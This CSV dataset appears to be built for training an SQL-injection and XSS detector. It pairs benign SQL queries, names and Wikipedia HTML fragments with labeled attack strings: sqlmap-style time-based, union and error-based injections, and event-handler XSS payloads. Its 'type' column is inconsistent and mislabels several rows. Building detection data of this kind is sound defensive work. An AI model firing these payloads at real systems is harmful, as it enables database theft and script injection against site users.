Text,Label,type
SELECT comfortable FROM zoo UNION SELECT allow FROM life ORDER BY fed,0,sql
tz_offset,1,sql
"<li><cite id=""CITEREFO&#39;Connor1994"" class=""citation journal"">O'Connor, Kathleen Malone (1994). <a rel=""nofollow"" class=""external text"" href=""http://repository.upenn.edu/dissertations/AAI9503804"">""The alchemical creation of life (takwin) and other concepts of Genesis in medieval Islam"" </a>. <i>Dissertations Available from ProQuest </i>. University of Pennsylvania: 1–435. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Dissertations+Available+from+ProQuest&amp;rft.atitle=The+alchemical+creation+of+life+%28takwin%29+and+other+concepts+of+Genesis+in+medieval+Islam&amp;rft.pages=1-435&amp;rft.date=1994&amp;rft.aulast=O%27Connor&amp;rft.aufirst=Kathleen+Malone&amp;rft_id=http%3A%2F%2Frepository.upenn.edu%2Fdissertations%2FAAI9503804&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
"c/ luarca, 151, 7?g",0,sql
SELECT * FROM plain,0,sql
27597488h,0,sql
"-4047'||  (  select 'rqta' from dual where 9743  =  9743 union all select 9743,9743,9743#",1,sql
44392621e,0,sql
SELECT connected ( s ) FROM complex INNER JOIN,0,sql
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 28313 )  ORDER BY meta_id ASC",0,sql
"1"" and elt  (  1210  =  1210,sleep  (  5   )    )    and ""phcl"" like ""phcl",1,xss
"	 </span> <span class=""reference-text""><cite class=""citation news""><a rel=""nofollow"" class=""external text"" href=""https://www.bbc.com/news/technology-41845878"">""Single pixel change fools AI programs"" </a>. <i>BBC News </i>. 3 November 2017<span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">12 March ",0,xss
puntallana,0,sql
SELECT * FROM herd FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM supply,0,xss
SELECT AVG ( Price ) FROM upward,0,sql
<rp onpointerdown=alert(1)>XSS</rp>,2,xss
SELECT AVG ( indicate ) FROM furniture SELECT SUM ( hat ) ,0,sql
"1"" or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and ""uqor"" like ""uqor",1,xss
SELECT AVG ( ice ) FROM nine SELECT SUM ( fairly ) ,0,sql
"	 </span> <span class=""reference-text"">",0,xss
"<q onmouseout=""alert(1)"">test</q>",2,xss
<mark onpointermove=alert(1)>XSS</mark>,2,xss
dalmacio,0,sql
lehar,0,sql
select   (  case when   (  6859  =  6507  )   then 6859 else 6859*  (  select 6859 from mysql.db  )   end  )  #,1,sql
<optgroup onpointerup=alert(1)>XSS</optgroup>,2,xss
"<rtc onmousedown=""alert(1)"">test</rtc>",2,xss
"1   )    )    as rpwt where 4103  =  4103 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,sql
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ""mpxd"" like ""mpxd",1,sql
"<menuitem draggable=""true"" ondrag=""alert(1)"">test</menuitem>",2,xss
"<div draggable=""true"" contenteditable>drag me</div><time ondrop=alert(1) contenteditable>drop here</time>",2,xss
doerksen,0,sql
"1'   )    )     )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,sql
SELECT * FROM dirty WHERE those NOT BETWEEN 'sound' AND 'grown',0,sql
"-8327 where 7555  =  7555 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1,sql
"<div draggable=""true"" contenteditable>drag me</div><script ondragover=alert(1) contenteditable>drop here</script>",2,xss
select * from users where id  =  1 %$ 1 or 1  =  1 -- 1,1,xss
select   (  case when   (  9434  =  2780  )   then 9434 else 9434*  (  select 9434 from information_schema.character_sets  )   end  )  #,1,sql
SELECT * FROM stop WHERE chart NOT LIKE '[cutting]%',0,sql
"<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script",2,xss
SELECT Count ( * )  AS just,0,sql
"<bgsound onmouseout=""alert(1)"">test</bgsound>",2,xss
"  SELECT examineID AS ID, seen AS cabin FROM add",0,xss
"1 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   -- zozj",1,sql
SELECT * FROM nothing FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM club,0,sql
SELECT * FROM value WHERE off = 'hard' LIMIT 3,0,sql
"	 </span><span style=""display: inline-block; margin-left: 4px; width: 182px; vertical-align: middle;""><a href=""https://www.wikidata.org/wiki/Q11660"" class=""extiw"" title=""d:Q11660"">Data </a> from Wikidata ",0,xss
SELECT TOP 3 * FROM pet WHERE talk = 'face',0,xss
"-9795  )   as wrgs where 5427  =  5427 union all select 5427,5427,5427,5427,5427,5427--",1,xss
-7941 or   (  5822  =  8754  )  *8754-- eepn,1,sql
"1'   )    )     )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (     (  'zxrb'  =  'zxrb",1,sql
SELECT TOP 3 * FROM on,0,sql
SELECT * FROM clock WHERE Price NOT BETWEEN 10 AND 20,0,sql
SELECT TOP 3 * FROM influence WHERE rear = 'straight' SELECT * FROM specific,0,sql
"<li><a href=""#CITEREFNewquist1994"">Newquist 1994 </a>, pp.&#160;155–183 </li> </ul>",0,xss
"<img oncontextmenu=""alert(1)"">test</img>",2,xss
1'   )    )    and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (   'gjja'  =  'gjja,1,sql
SELECT wp_posts.* FROM wp_posts WHERE ID IN  ( 367662 ) ,0,sql
"<li><a href=""/wiki/Radio-frequency_identification"" title=""Radio-frequency identification"">RFID </a>",0,xss
"	 </span>. New York: Harper &amp; Row. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=book&amp;rft.btitle=The+Shape+of+Automation+for+Men+and+Management&amp;rft.place=New+York&amp;rft.pub=Harper+%26+Row&amp;rft.date=1965&amp;rft.aulast=Simon&amp;rft.aufirst=H.+A.&amp;rft_id=https%3A%2F%2Farchive.org%2Fdetails%2Fshapeofautomatio00simo&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
"<A HREF=""http://ha.ckers.org@google""></A>",2,xss
"	 </span> <span class=""toctext"">Statistical learning ",0,xss
1%'   )    )     )   and sleep  (  5  )   and    (    (     (  '%'  =  ',1,sql
2813,0,sql
"	 </span> <span class=""reference-text"">",0,xss
"1%""  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  ""%""  =  """,1,xss
"<style>:target {color:red;}</style><tt id=x style=""transition:color 1s"" ontransitionend=alert(1)></tt>",2,xss
SELECT * FROM alive WHERE brief  BETWEEN 10 AND 20,0,sql
SELECT * FROM strike WHERE fighting = 'accurate'  AND City = 'exact',0,sql
"-1376%""   )    )     )   or 3458  =  9503 and    (    (     (  ""%""  =  """,1,sql
laga_rtijo,0,xss
1  )   where 1402  =  1402,1,sql
"1"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  ",1,sql
"  SELECT halfwayID AS ID, pen AS point FROM three",0,xss
bekki,0,xss
"INSERT INTO little  ( air, slowly, movie )  VALUES  ( 'pressure', 'search', 'classroom' )  ",0,sql
gemma,0,xss
genaro,0,sql
"1""   )    )     )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  ""prtf"" like ""prtf",1,sql
SELECT * FROM model WHERE find LIKE '%cloth%',0,sql
FROM  ( SELECT DISTINCT slipped FROM sink ) ,0,sql
"-5139   )    )    union all select 3373,3373,3373,3373,3373,3373,3373,3373#",1,sql
SELECT MIN ( wooden )  AS sight FROM valuable,0,sql
"<img draggable=""true"" ondragenter=""alert(1)"">test</img>",2,xss
"	 </span><span class=""mw-editsection""><span class=""mw-editsection-bracket"">[ ",0,xss
SELECT * FROM story,0,sql
gomero gallardo,0,sql
SELECT * FROM passage WHERE trouble LIKE '%pen%',0,sql
"-6519'   )    )    as tdlt where 5040  =  5040 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1,sql
select * from users where id  =  '1' or $ 1  =  1 or 1  =  1 -- 1',1,sql
"<source oncut=""alert(1)"" contenteditable>test</source>",2,xss
" SELECT column_name ( s )  FROM throat,tell",0,sql
"<li><cite id=""CITEREFTecuci2012"" class=""citation journal"">Tecuci, Gheorghe (March–April 2012). ""Artificial Intelligence"". <i>Wiley Interdisciplinary Reviews: Computational Statistics </i>. <b>4 </b> (2): 168–180. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1002%2Fwics.200"">10.1002/wics.200 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Wiley+Interdisciplinary+Reviews%3A+Computational+Statistics&amp;rft.atitle=Artificial+Intelligence&amp;rft.volume=4&amp;rft.issue=2&amp;rft.pages=168-180&amp;rft.date=2012-03%2F2012-04&amp;rft_id=info%3Adoi%2F10.1002%2Fwics.200&amp;rft.aulast=Tecuci&amp;rft.aufirst=Gheorghe&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
enjabonadura,0,sql
SELECT * FROM pile 3,0,sql
"	 </span> <span class=""reference-text"">",0,xss
"<li><a href=""/wiki/CMA-ES"" title=""CMA-ES"">Covariance Matrix Adaptation Evolution Strategy (CMA-ES) </a> </li>",0,xss
	 </span>(1910) </li>,0,xss
	 </span></p>,0,xss
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 3836 )  ORDER BY meta_id ASC",0,sql
SELECT * FROM capital  WHERE heard = judge,0,xss
SELECT * FROM fewer WHERE largest NOT BETWEEN 'jungle' AND 'house',0,sql
<q onfocusout=alert(1) tabindex=1 id=x></q><input autofocus>,2,xss
"select pg_sleep  (  5  )   and    (    (     (  ""nvuv"" like ""nvuv",1,sql
SELECT TOP 3 * FROM page WHERE chest = 'author',0,sql
SELECT * FROM welcome WHERE atom = 'load' LIMIT 3,0,sql
"<noscript ondblclick=""alert(1)"">test</noscript>",2,xss
pins turrubiartes,0,sql
"<style>:target {transform: rotate(180deg);}</style><strike id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></strike>",2,xss
"			<div class=""after-portlet after-portlet-lang""><span class=""wb-langlinks-edit wb-langlinks-link""><a href=""https://www.wikidata.org/wiki/Special:EntityPage/Q11660#sitelinks-wikipedia"" title=""Edit interlanguage links"" class=""wbc-editpage"">Edit links </a> ",0,xss
	 </span>,0,xss
"<style>@keyframes x{}</style><b style=""animation-name:x"" onanimationstart=""alert(1)""></b>",2,xss
47343175k,0,sql
SELECT * FROM knew WHERE    NOT maybe = 'gray',0,sql
aisha,0,sql
1  )   union all select null#,1,sql
"<div draggable=""true"" contenteditable>drag me</div><figcaption ondragover=alert(1) contenteditable>drop here</figcaption>",2,xss
1  )   where 2083  =  2083,1,sql
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 715 )  ORDER BY meta_id ASC",0,sql
end# thjv,1,sql
6onc+hesta,0,sql
SELECT AVG ( met )  FROM cap  SELECT SUM ( final ) ,0,sql
SELECT * FROM football WHERE shaking = 'sport'  OR clothing = 'oil',0,sql
	 </span></a></dt><dd>Customize the input and output of your spiders.</dd>,0,xss
SELECT * FROM settle WHERE or BETWEEN '1996-07-01' AND '1996-07-31',0,sql
SELECT * FROM lady FETCH FIRST 3 ROWS ONLY,0,xss
1%'  )   rlike sleep  (  5  )  #,1,sql
SELECT * FROM long WHERE examine = 'log',0,sql
"select * from generate_series  (  7610,7610,case when   (  7610  =  9416  )   then 1 else 0 end  )   limit 1--",1,sql
"   SELECT A.CustomerName AS CustomerName1, B.CustomerName AS CustomerName2,    A.CityFROM Customers A, Customers BWHERE A.CustomerID <> B.CustomerID  AND A.City  =  B.City ",0,xss
"1 union all select null,null,null--",1,sql
"1%'  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  '%'  =  '",1,sql
84,0,xss
	 </span> ,0,xss
"1""  )   as yzzk where 1813  =  1813 and   (  3020  =  3020  )  *6703--",1,sql
SELECT AVG ( lying ) FROM be,0,sql
"	 </span><span class=""mw-editsection""><span class=""mw-editsection-bracket"">[ ",0,xss
"<blockquote onmouseleave=""alert(1)"">test</blockquote>",2,xss
<rp id=x tabindex=1 onfocus=alert(1)></rp>,2,xss
"  SELECT highway AS think, passage AS [cold]  FROM planning",0,sql
SELECT darkness ( s )  FROM bottom,0,sql
"1%""  )   and 9764  =  6037 and   (  ""%""  =  """,1,xss
-5020%'  )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  '%'  =  ',1,xss
"<table onmousemove=""alert(1)"">test</table>",2,xss
"  SELECT grade,wagon,worse FROM accident LEFT JOIN Orders ON spend.ownerID =  buy.coming ORDER BY aware.pool",0,sql
0x77616974666F722064656C61792027303A303A31302700 exec  (  @s  ) ,1,sql
SELECT * FROM shot FETCH FIRST 50 PERCENT ROWS ONLY,0,sql
SELECT sea ( s FROM consider RIGHT JOIN,0,xss
SELECT AVG ( gentle ) FROM continued SELECT SUM ( cry ) ,0,sql
atilio,0,sql
SELECT TOP 3 * FROM pig WHERE slow = 'cry',0,sql
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 4069 )  ORDER BY meta_id ASC",0,sql
1'  )   where 2763  =  2763,1,sql
detleff3,0,sql
<output id=x tabindex=1 onfocus=alert(1)></output>,2,xss
"<table oncontextmenu=""alert(1)"">test</table>",2,xss
rhett,0,sql
SELECT * FROM excitement FETCH FIRST 50 PERCENT ROWS ONLY,0,xss
"1%"" and make_set  (  2905  =  5725,5725  )   and ""%""  =  """,1,sql
SELECT above FROM palace,0,sql
7839,0,sql
"1'   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  'sjxp' like 'sjxp",1,xss
"1  )   as qzif where 7877  =  7877 union all select null,null,null,null,null,null,null--",1,sql
"<style>@keyframes slidein {}</style><ruby style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></ruby>",2,xss
SELECT MIN ( property )  AS attempt FROM explore,0,sql
queral queral,0,sql
SELECT COUNT ( plates ) FROM needed,0,sql
 (  select   (  case when   (  3348  =  1710  )   then 3348 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  ) ,1,sql
13082383y,0,sql
"<li><a href=""/wiki/Panpsychism"" title=""Panpsychism"">Panpsychism </a> </li>",0,xss
SELECT * FROM fur WHERE habit BETWEEN 'grown' AND 'reason',0,sql
"plaa adria 152,",0,sql
18212,0,xss
SELECT COUNT ( worryID ) FROM dog,0,xss
tarpey@bwds.ne,0,sql
arcos,0,sql
"1,  (  case when 2872  =  2872 then 1 else null end  )  ",1,sql
"<ul><li><a href=""/wiki/Computer_animation"" title=""Computer animation"">Animation </a> </li>",0,xss
"<p onbeforecopy=""alert(1)"" contenteditable>test</p>",2,xss
"<code onmouseout=""alert(1)"">test</code>",2,xss
cossovel-heintel@camiones-hibridos.ec,0,sql
<main onpointerup=alert(1)>XSS</main>,2,xss
"<style>:target {color: red;}</style><legend id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></legend>",2,xss
" select * from users where id  =  1 or 1#""? union select version  (    )  ,version  (    )   -- 1",1,sql
"-4746%""   )    )     )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  ""%""  =  """,1,xss
larribea,0,sql
"<li>Johnston, John (2008) <i>The Allure of Machinic Life: Cybernetics, Artificial Life, and the New AI </i>, MIT Press. </li>",0,xss
duo_davalos@designworld.cz,0,xss
cuenca,0,sql
	 </span> </h4>,0,xss
"<li><a href=""/wiki/Machine_vision"" title=""Machine vision"">Machine vision </a> </li>",0,xss
DELETE FROM swept,0,sql
"<param ondblclick=""alert(1)"">test</param>",2,xss
"1"" and   (  3020  =  3020  )  *6703 and ""tnzp"" like ""tnzp",1,sql
	 </span> </h3>,0,xss
"1"" and 4996  =  4431 and ""jzaq""  =  ""jzaq",1,sql
"merca, a",0,sql
"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Discover+Magazine&amp;rft.atitle=Cultivating+Common+Sense+%7C+DiscoverMagazine.com&amp;rft.date=2017&amp;rft_id=http%3A%2F%2Fdiscovermagazine.com%2F2017%2Fapril-2017%2Fcultivating-common-sense&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
	 </span> ,0,xss
"1""  )   as ckoi where 4674  =  4674 union all select null,null,null,null,null,null,null,null,null,null#",1,sql
capella,0,sql
"<span onkeypress=""alert(1)"" contenteditable>test</span>",2,xss
"<div draggable=""true"" contenteditable>drag me</div><summary ondragover=alert(1) contenteditable>drop here</summary>",2,xss
"<div onmouseover=""alert(1)"">test</div>",2,xss
"<dd onmouseover=""alert(1)"">test</dd>",2,xss
"<li><a href=""/wiki/Computability"" title=""Computability"">Computability </a> </li>",0,xss
"<dir onbeforecopy=""alert(1)"" contenteditable>test</dir>",2,xss
SELECT TOP 3 * FROM climate SELECT * FROM rate 3SELECT * FROM show,0,sql
almansa ingls,0,xss
SELECT fell FROM single UNION ALL SELECT crew FROM stomach ORDER BY aboard,0,sql
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 28553 )  ORDER BY meta_id ASC",0,sql
"1'+  (  select 'nzgq' where 7230  =  7230 and elt  (  1210  =  1210,sleep  (  5   )    )     )  +'",1,sql
4.64693E+15,0,xss
"<q onbeforepaste=""alert(1)"" contenteditable>test</q>",2,xss
